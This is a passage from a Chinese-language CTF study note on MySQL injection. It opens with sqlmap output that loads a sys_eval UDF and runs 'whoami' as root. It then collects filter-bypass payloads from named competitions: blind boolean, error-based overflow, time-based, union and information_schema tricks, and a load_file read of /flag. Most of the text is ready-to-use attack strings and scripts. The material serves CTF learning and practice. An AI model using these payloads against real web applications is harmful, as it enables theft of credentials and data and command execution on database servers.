[13:32:23] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:32:23] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> create function sys_eval returns string soname 'lib_mysqludf_sys_64.so'
[13:34:56] [INFO] executing SQL data definition statement: 'create function sys_eval returns string soname 'lib_mysqludf_sys_64.so''
create function sys_eval returns string soname 'lib_mysqludf_sys_64.so': 'NULL'
sql-shell> select sys_eval('whoami');
[13:35:59] [INFO] fetching SQL SELECT statement query output: 'select sys_eval('whoami')'
select sys_eval('whoami') [1]:
[*] root

sql-shell>
```

sqlmap中的udf文件提供的函数：

sys_eval，执行任意命令，并将输出返回。

sys_exec，执行任意命令，并将退出码返回。

sys_get，获取一个环境变量。

sys_set，创建或修改一个环境变量。

...

## 例题字节跳动

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340185-308e703e-a150-4cf2-b9d7-74128cb920f9.png#averageHue=%23fefefe&id=smqdQ&originHeight=535&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340270-98f0bbc2-674f-41d0-9c32-f0ce1d1fe592.png#averageHue=%23fefefd&id=Rg44G&originHeight=506&originWidth=1162&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340366-2e0e5111-c089-4513-87bc-df2e2978e92d.png#averageHue=%236ca863&id=zQanV&originHeight=410&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

# 综合性绕过payload

### adminprofile

第四届“强网”拟态挑战赛的决赛中的题目大概是思路是：

1. INSERT()截取+报错盲注，注出密码
2. 登录，通过AJAX找接口，发现任意读
3. 读源码，justSafeSet模块存在原型链污染漏洞
4. AST Injection RCE

注入大概是过滤了if case exp cot和好多字符串截取和比较的关键字。注入的exp如下

```python
" || POW(2-((ORD(INSERT((INSERT((PASSWORD),1,1,'')),2,9999999,'')))>107),9999999999);
原理就是利用为真的话就是2-1=1，1的99999999次立方还是1，不会溢出。但是如果是假就是2的的99999999次立方就会报错
```

我本地测试的例子如下。可以一个个把password测出来

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340461-95cf303e-0a77-4ebb-a903-c617fae45a13.png#averageHue=%23c1aa8d&id=Xq3L9&originHeight=200&originWidth=545&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340538-ac149b16-d6ea-4f0a-8b2b-b2fdbf9e5fcd.png#averageHue=%23e2c5ae&id=fXAGb&originHeight=298&originWidth=1309&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340621-b17501ce-0914-43d3-9af7-5921f8615260.png#averageHue=%23fdfcfb&id=DyXef&originHeight=497&originWidth=1365&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### false注入例题

黑名单如下

```php
$filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
```

存在下面代码。很明显的一个false注入

```php
 $sql = "select role from `user` where username ='".$username."'";
   $res = $conn ->query($sql);
   if($res->num_rows>0){
        echo "$username is ".$res->fetch_assoc()['role'];
   }else{
        die("Don't have this user!");
   }
```

这里的payload如下

```php
username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
```

这里的话感觉

```php
username="admin'^((ASCII(MID((passwd)FROM 2)))=111)^'1"  这样的话当中间的值为0的手整一个运行"aaa"^0^"aa"就是0，当中间值不为0的时候，"aaa"^0^"aa"就不是0
```

### 2022字节CTFdatamanager

发现 /dashboard 下可以 order by 注入，但是过滤了逗号，可以将 if()拆写成 case when then else end 的格式，配合笛卡尔积和 like 盲注。这里还用到了逗号的过滤技巧。上面都有写

用的到payload大致如下

```python
database_payload="case when (database() like binary {}25) then (select b.table_name from information_schema.tables a join information_schema.columns b order by 1 limit 1) else 1 end"
table_name_payload = "case when (select (select table_name from information_schema.tables where table_schema like 0x646174616d616e61676572 limit 1 offset 1) like binary {}25) then (select b.table_name from information_schema.tables a join information_schema.columns b order by 1 limit 1) else 1 end"
column_name_payload = "case when (select (select column_name from information_schema.columns where table_name like 0x7573657273 limit 1 offset 5) like binary {}25) then (select b.table_name from information_schema.tables a join information_schema.columns b order by 1 limit 1) else 1 end"
password_payload = "case when (select (select pas$worD from users where id like 0x31 limit 1 offset 0) like binary {}25) then (select b.table_name from information_schema.tables a join information_schema.columns b order by 1 limit 1) else 1 end"
```

### CISCN2022初赛ezpentest

```python
payload="0'||case'1'when`password`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'"#这里过滤了取反，所以要用9223372036854775807+1这个也可以18446744073709551615+1来代替溢出
这里就是mysql8的小技巧，利用了utf8mb4_bin来区分大小写，代替binary
```

### 2022虎符CTFbabysql

```python
'username': "1'||case'1'when`password`regexp'^{}'collate'utf8mb4_0900_as_cs'then'1'else~0+1+''end||'1".format(username + i)
CISCN2022初赛ezpentest可以说就是改的这个题
```

### 2022DASCTF2022.07赋能赛

这里考的还是一个布尔盲注

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340707-2e6f4b16-5f0f-41fb-b73d-ca5751b36ab0.png#averageHue=%23f3f3f3&id=HB96j&originHeight=140&originWidth=516&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```python
paylaod = "2 and ascii(substr((select group_concat(password) from users),{},1))>{}".format(i, mid)  这个是我看wp的，神奇，上面明明已经ban了逗号了
我把上面的payload改成了下面
paylaod = "2 and ascii(substr((select group_concat(password) from users) from 1 for 1))>{}".format(i, mid)
```

### 2022第五空间初赛

#### 5_easylogin

建立虚拟表直接登录。后台逻辑是MD5比较。有类似原题

```python
username=admin%df%27ununionion%0aseselectlect%0a66,66,0x3437626365356337346635383966343836376462643537653963613966383038#&password=aaa

0x3437626365356337346635383966343836376462643537653963613966383038的16进制解码是aaa的md5的值
```

#### 5_web_Eeeeasy_SQL

还是老常客，case when注入

```python
password="or(case when (binary username> ".replace(" ","\\x09")+result+") then 1 else 9223372036854775807+1 end)#".replace(" ","\\x09")

password=f'or(case(instr(binary(password),0x{t}))when(1)then(cot(0))else(1)end)#'

password="or pow(2-(case when),9999999999)#"
```

### 2022第五空间决赛easysqli

```python
3'/**/union/**/select/**/1,concat(0x7e,(select/**/group_concat(password)/**/from/**/users),0x7e),3/**/or/**/'3'='3
```

### 2022强网拟态popsql

```python
password= 1'or/**/if((select/**/strcmp(ord(right((select(group_concat(table_name))from(sys.sch 
ema_table_statistics)),{_})),{i})),1,benchmark(5000000,sha(1)))/**/or'1

password=f"1'or/**/if((select/**/strcmp(ord(right((select(group_concat(query))from( 
sys.x$statement_analysis)),{_})),{i})),1,benchmark(5000000,sha(1)))/**/or'1
```

### RoarCTF2020ezsql

参考wp

```python
a'||(('def','ctf','f11114g','z',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,0,0)<=(TABLE/**/information_schema.columns/**/order/**/by/**/table_schema/**/limit/**/3,1))#

得到 f11114g表名
直接注flag

payload = 'admin\'and/**/substr((table/**/f11114g/**/limit/**/1,1),{},1)=\'{}\'#'

a'||(('{}')<=binary(TABLE/**/f11114g/**/limit/**/1,1))#
```

### 2022年蓝帽决赛simple-fish

还是mysql8的一个注入。感觉并没有多难。

```
sql = f"(0x646566,{makehex('fish')},{makehex('F5fl11A6g99')},%s,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,10,21,22)>(table information_schema.columns limit {mysqlline},1)" % makehex(ans + chr(mid))
# 先是注出全部的数据库,发现只有一个fish数据库,之后通过行数和字段数逐个微调注入得到表名字段名,最后确定falg在fish.F5fl11A6g99表的F511LAAGG字段,这个表只有两个字段,第一个是id,第二个是flag的字段,所以构造得到如下语句
sql = f"({mysqlline+1},%s)>(table fish.F5fl11A6g99 limit {mysqlline},1)" % makehex(ans + chr(mid))
```

### HFCTF2021-hatenum

黑名单如下。比较特别的是这里还有禁止长度超过9的数字和字符串出现

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340817-d88fea55-0b05-4903-a1e7-8b6fa43d465d.png#averageHue=%23f4f8fd&id=ufBOY&originHeight=494&originWidth=1336&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这里用到了上面总结的大数绕过。就是用unhex和hex还有科学计数法来做

首先绕过闭合

```
username=admin\
password=||1#
select * from users where username='admin\' and password='||1#'
```

后面注入的payload如下。每次三个三个来匹配。用的是报错注入。具体去参考写脚本技巧

```
payload="||exp(710-(code rlike binary "+hexer(guess+c)+"))#"
```

### i春秋2022晋升之路

这道题是读jwt里面的sql注入，很麻烦的题目

```python
payload="'^(substr((select/**/binary/**/load_file(0x2f666c6167)),{i},1)>binary/**/{mid})/**/and/**/sleep(2)^'".format(i=i,mid=hex(mid))

这里是sql注入读文件，用16进制绕过flag字符串
payload="(substr((select/**/binary/**/load_file(0x2f666c6167)),{i},1)>binary/**/{mid})/**/and/**/sleep(1)".format(i=i,mid=hex(mid))
```
